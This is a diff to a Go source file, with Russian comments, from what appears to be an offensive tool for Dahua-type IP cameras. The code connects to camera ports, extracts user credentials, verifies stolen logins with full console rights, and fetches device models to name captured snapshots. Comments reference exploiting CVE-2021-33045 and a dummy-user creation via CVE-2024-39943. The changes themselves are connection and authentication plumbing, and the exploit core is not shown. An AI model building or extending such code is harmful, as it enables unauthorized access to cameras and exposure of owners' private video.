@@ -6,7 +6,6 @@ package dhip
 
 import (
 	"fmt"
-	"krushitel/proxy"
 	"net"
 	"time"
 )
@@ -14,9 +13,9 @@ import (
 // Dialer — открывает соединение с портом камеры (5000/80/37777).
 type Dialer func() (net.Conn, error)
 
-// AddrDialer — классический TCP-дайл на адрес (для Local()-форвардов или прямого подключения через прокси).
+// AddrDialer — классический TCP-дайл на адрес (для Local()-форвардов).
 func AddrDialer(addr string, timeout time.Duration) Dialer {
-	return func() (net.Conn, error) { return proxy.DialTimeout("tcp", addr, timeout) }
+	return func() (net.Conn, error) { return net.DialTimeout("tcp", addr, timeout) }
 }
 
 // ExtractCredsDial — логин + console + OnvifUser -u → список пользователей.
@@ -47,9 +46,9 @@ func tryExtractCredsDial(dial Dialer, timeout time.Duration) ([]DhipUser, error)
 	return tryExtractCredsConn(conn)
 }
 
-// VerifyLoginDial — строгая проверка кредов полноценным challenge-логином.
-// Не использует loopback/NetKeyboard байпассы (CVE-2021-33045), чтобы исключить
-// ложные срабатывания на неверных паролях.
+// VerifyLoginDial — проверка кредов полноценным challenge-логином с
+// clientType Console (полные права). Для верификации dummy-юзера из
+// CVE-2024-39943 важно передавать именно имя созданного юзера.
 func VerifyLoginDial(dial Dialer, user, password string, timeout time.Duration) error {
 	conn, err := dial()
 	if err != nil {
@@ -57,9 +56,9 @@ func VerifyLoginDial(dial Dialer, user, password string, timeout time.Duration) 
 	}
 	defer conn.Close()
 
-	time.Sleep(200 * time.Millisecond)
+	time.Sleep(2 * time.Second)
 
-	if _, err := dhipLoginStrict(conn, nil, user, password); err != nil {
+	if _, err := dhipLoginAs(conn, nil, user, password); err != nil {
 		return err
 	}
 	return nil
@@ -67,14 +66,20 @@ func VerifyLoginDial(dial Dialer, user, password string, timeout time.Duration) 
 
 // DeviceModelDial — модель камеры (для имён файлов снапов). Best-effort.
 func DeviceModelDial(dial Dialer, timeout time.Duration) string {
+	return DeviceModelDialAs(dial, "", "", timeout)
+}
+
+// DeviceModelDialAs — модель камеры с аутентификацией указанного пользователя.
+func DeviceModelDialAs(dial Dialer, user, pass string, timeout time.Duration) string {
 	conn, err := dial()
 	if err != nil {
 		return ""
 	}
 	defer conn.Close()
-	m, err := tryDeviceModelConn(conn)
+	m, err := tryDeviceModelConnAs(conn, user, pass)
 	if err != nil {
 		return ""
 	}
 	return m
 }
+
